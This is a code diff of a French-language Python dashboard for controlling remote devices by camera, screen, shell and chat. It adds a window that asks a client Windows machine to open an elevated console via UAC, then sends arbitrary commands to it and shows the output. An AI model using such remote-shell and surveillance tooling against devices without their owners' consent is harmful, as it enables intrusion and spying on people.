+        win.protocol("WM_DELETE_WINDOW", lambda: self._close_cmd_window(device_id, win))
 
-    def _open_chat_window(self, device_id: str) -> None:
-        win = self._chat_windows.get(device_id)
-        if win is not None and win.winfo_exists():
-            win.deiconify()
-            win.lift()
-            return
-
-        name = self.devices.get(device_id, {}).get("name", device_id[:8])
-        win = tk.Toplevel(self.root)
-        win.title(f"Chat — {name}")
-        win.geometry("620x520")
-        win.configure(bg=COLOR_BG)
-
-        history = tk.Text(win, bg=COLOR_VIDEO_BG, fg=COLOR_TEXT, font=(FONT, 10),
-                          wrap="word", state="disabled", borderwidth=0, highlightthickness=0)
-        history.pack(fill="both", expand=True, padx=10, pady=(10, 4))
-
-        bottom = tk.Frame(win, bg=COLOR_BG)
-        bottom.pack(fill="x", padx=10, pady=(4, 10))
-        entry = ttk.Entry(bottom, font=(FONT, 10))
-        entry.pack(side="left", fill="x", expand=True, ipady=3)
-
-        def send(_evt=None):
-            msg = entry.get()
-            if not msg:
-                return
-            try:
-                requests.post(f"{self.server_url}/api/shell/chat",
-                              json={"device_id": device_id, "message": msg},
-                              timeout=REQUEST_TIMEOUT)
-            except requests.RequestException as exc:
-                self._log(f"Chat : {exc}")
-            entry.delete(0, tk.END)
-
-        entry.bind("<Return>", send)
-
-        ctrl = tk.Frame(bottom, bg=COLOR_BG)
-        ctrl.pack(side="right", padx=(8, 0))
-        ttk.Button(ctrl, text="Ouvrir console", style="Primary.TButton",
-                   command=lambda: requests.post(f"{self.server_url}/api/shell/chat_window",
-                                                  json={"device_id": device_id,
-                                                        "command": "OPEN"},
-                                                  timeout=REQUEST_TIMEOUT)).pack(side="left", padx=(0, 6))
-        ttk.Button(ctrl, text="Fermer console",
-                   command=lambda: requests.post(f"{self.server_url}/api/shell/chat_window",
-                                                  json={"device_id": device_id,
-                                                        "command": "CLOSE"},
-                                                  timeout=REQUEST_TIMEOUT)).pack(side="left")
-
-        def poll():
-            if not win.winfo_exists():
-                return
-            try:
-                r = requests.get(f"{self.server_url}/api/shell/results",
-                                  params={"device_id": device_id},
-                                  timeout=REQUEST_TIMEOUT)
-                if r.status_code == 200:
-                    data = r.json()
-                    history.configure(state="normal")
-                    history.delete("1.0", tk.END)
-                    for item in data.get("chat_history", []):
-                        who = "Moi" if item.get("role") == "moi" else "Client"
-                        history.insert(tk.END, f"{who}: {item.get('text', '')}\n")
-                    history.see(tk.END)
-                    history.configure(state="disabled")
-            except requests.RequestException:
-                pass
-            win.after(SHELL_CHAT_POLL_INTERVAL_MS, poll)
-
-        win.after(200, poll)
-        win.protocol("WM_DELETE_WINDOW", win.destroy)
-        self._chat_windows[device_id] = win
+    def _close_cmd_window(self, device_id: str, win: tk.Toplevel) -> None:
+        try:
+            win.destroy()
+        except Exception:
+            pass
+        self._cmd_windows.pop(device_id, None)
 
     # ------------------------------------------------------------------
+    # CMD Commandes ADMIN (fenêtre GUI par appareil) — NOUVEAU
+    # ------------------------------------------------------------------
+    def _open_admin_cmd_window_for_selected(self) -> None:
+        if self.selected_device_id is None:
+            self._log("Aucun appareil sélectionné")
+            return
+        device = self.devices.get(self.selected_device_id)
+        if not device or device.get("platform") != "windows":
+            self._log("CMD Admin indisponible : le client n'est pas sous Windows.")
+            return
+        self._open_admin_cmd_window(self.selected_device_id)
+
+    def _open_admin_cmd_window(self, device_id: str) -> None:
+        existing = self._admin_cmd_windows.get(device_id)
+        if existing is not None and existing.winfo_exists():
+            existing.lift()
+            existing.focus_force()
+            return
+
+        win = tk.Toplevel(self.root)
+        win.title(f"CMD Admin — {device_id[:8]}")
+        win.geometry("820x520")
+        win.configure(bg=COLOR_BG)
+        self._admin_cmd_windows[device_id] = win
+
+        top = tk.Frame(win, bg=COLOR_BG)
+        top.pack(fill="x", padx=10, pady=(10, 0))
+        state_var = tk.StringVar(value="Console ADMIN : ● fermée")
+        tk.Label(top, textvariable=state_var, bg=COLOR_BG, fg=COLOR_MUTED,
+                 font=(FONT, 9, "bold")).pack(side="left")
+
+        def open_remote():
+            try:
+                requests.post(
+                    f"{self.server_url}/api/shell/admin/console",
+                    json={"device_id": device_id, "command": "OPEN"},
+                    timeout=REQUEST_TIMEOUT,
+                )
+                self._log(f"[{device_id[:8]}] Console ADMIN : ouverture demandée (UAC chez le client)")
+            except requests.RequestException as exc:
+                self._log(f"Échec : {exc}")
+
+        def close_remote():
+            try:
+                requests.post(
+                    f"{self.server_url}/api/shell/admin/console",
+                    json={"device_id": device_id, "command": "CLOSE"},
+                    timeout=REQUEST_TIMEOUT,
+                )
+                self._log(f"[{device_id[:8]}] Console ADMIN : fermeture demandée")
+            except requests.RequestException as exc:
+                self._log(f"Échec : {exc}")
+
+        ttk.Button(top, text="▶ Ouvrir chez le client (UAC)", style="Start.TButton",
+                   command=open_remote).pack(side="right", padx=(6, 0))
+        ttk.Button(top, text="■ Fermer chez le client", style="Stop.TButton",
+                   command=close_remote).pack(side="right")
+
+        output = tk.Text(
+            win, bg=COLOR_VIDEO_BG, fg="#d0d7ee", font=(FONT_MONO, 10),
+            insertbackground=COLOR_TEXT, relief="flat", wrap="char", state="disabled",
+        )
+        output.pack(fill="both", expand=True, padx=10, pady=(8, 6))
+
+        entry_frame = tk.Frame(win, bg=COLOR_BG)
+        entry_frame.pack(fill="x", padx=10, pady=(0, 10))
+        prompt_var = tk.StringVar(value="ADMIN>")
+        tk.Label(entry_frame, textvariable=prompt_var, bg=COLOR_BG, fg=COLOR_WARN,
+                 font=(FONT_MONO, 10, "bold")).pack(side="left")
+        cmd_var = tk.StringVar()
+        entry = ttk.Entry(entry_frame, textvariable=cmd_var, font=(FONT_MONO, 10))
+        entry.pack(side="left", fill="x", expand=True, ipady=4, padx=(6, 0))
+        entry.focus_set()
+
+        def send_command(event=None):
+            cmd = cmd_var.get()
+            if not cmd.strip():
+                return
+            cmd_var.set("")
+            try:
+                requests.post(
+                    f"{self.server_url}/api/shell/admin/input",
+                    json={"device_id": device_id, "text": cmd},
+                    timeout=REQUEST_TIMEOUT,
+                )
+            except requests.RequestException as exc:
+                self._log(f"Erreur envoi commande admin : {exc}")
+
+        entry.bind("<Return>", send_command)
+
+        last_seq = {"value": -1}
+
+        def refresh():
+            if not win.winfo_exists():
+                self._admin_cmd_windows.pop(device_id, None)
+                return
+            try:
+                resp = requests.get(
+                    f"{self.server_url}/api/shell/admin/output/latest",
+                    params={"device_id": device_id, "after": last_seq["value"], "wait": 1.0},
+                    timeout=3,
+                )
+                if resp.status_code == 200:
+                    data = resp.json()
+                    if data["seq"] != last_seq["value"]:
+                        last_seq["value"] = data["seq"]
+                        output["state"] = "normal"
+                        output.delete("1.0", "end")
+                        output.insert("end", data["buffer"])
+                        output.see("end")
+                        output["state"] = "disabled"
+                    if data.get("admin_refused"):
+                        state_var.set("Console ADMIN : ⚠ UAC refusé par l'utilisateur du client")
+                    else:
+                        state_var.set(
+                            "Console ADMIN : " + ("● ouverte" if data["console_open"] else "● fermée")
+                        )
+            except requests.RequestException:
+                pass
+            win.after(SHELL_OUTPUT_POLL_INTERVAL_MS, refresh)
+
+        refresh()
+        output["state"] = "normal"
+        output.insert("end", "Cliquez sur « Ouvrir chez le client (UAC) » pour démarrer la console élevée.\n")
+        output["state"] = "disabled"
+        # Fermer la fenêtre GUI NE ferme PAS la console distante.
+        win.protocol("WM_DELETE_WINDOW", lambda: self._close_admin_cmd_window(device_id, win))
+
+    def _close_admin_cmd_window(self, device_id: str, win: tk.Toplevel) -> None:
+        try:
+            win.destroy()
+        except Exception:
+            pass
+        self._admin_cmd_windows.pop(device_id, None)
+
+    # ------------------------------------------------------------------
+    # Chat (fenêtre GUI par appareil)
+    # ------------------------------------------------------------------
+    def _open_chat_window_for_selected(self) -> None:
+        if self.selected_device_id is None:
+            self._log("Aucun appareil sélectionné")
+            return
+        self._open_chat_window(self.selected_device_id)
+
+    def _open_chat_window(self, device_id: str) -> None:
+        existing = self._chat_windows.get(device_id)
+        if existing is not None and existing.winfo_exists():
+            existing.lift()
+            existing.focus_force()
+            return
+
+        win = tk.Toplevel(self.root)
+        win.title(f"Chat — {device_id[:8]}")
+        win.geometry("500x560")
+        win.configure(bg=COLOR_BG)
+        self._chat_windows[device_id] = win
+
+        top = tk.Frame(win, bg=COLOR_BG)
+        top.pack(fill="x", padx=10, pady=(10, 0))
+        remote_state_var = tk.StringVar(value="Console distante : ● fermée")
+        tk.Label(top, textvariable=remote_state_var, bg=COLOR_BG, fg=COLOR_MUTED,
+                 font=(FONT, 9, "bold")).pack(side="left")
+
+        def open_remote():
+            try:
+                requests.post(
+                    f"{self.server_url}/api/shell/chat_window",
+                    json={"device_id": device_id, "command": "OPEN"},
+                    timeout=REQUEST_TIMEOUT,
+                )
+                self._log(f"[{device_id[:8]}] Chat : ouverture demandée")
+            except requests.RequestException as exc:
+                self._log(f"Échec : {exc}")
+
+        def close_remote():
+            try:
+                requests.post(
+                    f"{self.server_url}/api/shell/chat_window",
+                    json={"device_id": device_id, "command": "CLOSE"},
+                    timeout=REQUEST_TIMEOUT,
+                )
+                self._log(f"[{device_id[:8]}] Chat : fermeture demandée")
+            except requests.RequestException as exc:
+                self._log(f"Échec : {exc}")
+
+        ttk.Button(top, text="🌐 Ouvrir chez le client", style="Start.TButton",
+                   command=open_remote).pack(side="right", padx=(6, 0))
+        ttk.Button(top, text="✖ Fermer chez le client", style="Stop.TButton",
+                   command=close_remote).pack(side="right")
+
+        history = tk.Text(
+            win, bg=COLOR_VIDEO_BG, fg=COLOR_TEXT, font=(FONT, 10),
+            relief="flat", wrap="word", state="disabled",
+        )
+        history.pack(fill="both", expand=True, padx=10, pady=(8, 6))
+        history.tag_configure("moi", foreground=COLOR_CAMERA)
+        history.tag_configure("client", foreground=COLOR_SCREEN)
+
+        entry_frame = tk.Frame(win, bg=COLOR_BG)
+        entry_frame.pack(fill="x", padx=10, pady=(0, 10))
+        msg_var = tk.StringVar()
+        entry = ttk.Entry(entry_frame, textvariable=msg_var)
+        entry.pack(side="left", fill="x", expand=True, ipady=4)
+        entry.focus_set()
+
+        def append_history(role: str, text: str):
+            history["state"] = "normal"
+            prefix = "Auteur: " if role == "moi" else "Toi: "
+            tag = "moi" if role == "moi" else "client"
+            history.insert("end", prefix + text + "\n", tag)
+            history.see("end")
+            history["state"] = "disabled"
+
+        def send_message(event=None):
+            msg = msg_var.get().strip()
+            if not msg:
+                return
+            msg_var.set("")
+            append_history("moi", msg)
+            try:
+                requests.post(
+                    f"{self.server_url}/api/shell/chat",
+                    json={"device_id": device_id, "message": msg},
+                    timeout=REQUEST_TIMEOUT,
+                )
+            except requests.RequestException as exc:
+                append_history("client", f"[erreur réseau : {exc}]")
+
+        entry.bind("<Return>", send_message)
+        ttk.Button(entry_frame, text="Envoyer", command=send_message).pack(side="left", padx=(8, 0))
+
+        def refresh():
+            if not win.winfo_exists():
+                self._chat_windows.pop(device_id, None)
+                return
+            try:
+                st = requests.get(
+                    f"{self.server_url}/api/shell/chat_window/state",
+                    params={"device_id": device_id}, timeout=2,
+                )
+                if st.status_code == 200:
+                    data = st.json()
+                    remote_state_var.set(
+                        "Console distante : " + ("● ouverte" if data.get("window_open") else "● fermée")
+                    )
+                resp = requests.get(
+                    f"{self.server_url}/api/shell/results",
+                    params={"device_id": device_id}, timeout=2,
+                )
+                if resp.status_code == 200:
+                    for msg in resp.json().get("chat_in", []):
+                        append_history("client", msg["message"])
+            except requests.RequestException:
+                pass
+            win.after(SHELL_CHAT_POLL_INTERVAL_MS, refresh)
+
+        refresh()
+        win.protocol("WM_DELETE_WINDOW", lambda: self._close_chat_window(device_id, win))
+
+    def _close_chat_window(self, device_id: str, win: tk.Toplevel) -> None:
+        try:
+            win.destroy()
+        except Exception:
+            pass
+        self._chat_windows.pop(device_id, None)
+
+    # ------------------------------------------------------------------
+    # Fermeture
+    # ------------------------------------------------------------------
     def _on_close(self) -> None:
+        """Arrête proprement les enregistrements en cours, puis ferme la fenêtre."""
+        for key, panel in self.panels.items():
+            if panel.recording:
+                self._stop_recording(key)
         self.root.destroy()
 
 
 def parse_args() -> argparse.Namespace:
-    parser = argparse.ArgumentParser(description="Interface de contrôle à distance")
-    parser.add_argument("--server", help="URL du serveur (ex. https://mon-serveur.onrender.com)")
-    parser.add_argument("--save", action="store_true",
-                        help="mémorise --server pour les prochains lancements")
+    parser = argparse.ArgumentParser(description="Dashboard de contrôle caméra / écran / shell / chat")
+    parser.add_argument("--server", help="URL du serveur (ex. https://mon-serveur.com)")
+    parser.add_argument("--save", action="store_true", help="mémorise --server pour les prochains lancements")
     return parser.parse_args()
 
 
 def main() -> None:
     args = parse_args()
     server_url = resolve_server_url(args.server)
-    if args.save and args.server:
+    if args.save:
+        if not args.server:
+            print("--save nécessite --server")
+            return
         save_config(server_url)
 
     root = tk.Tk()
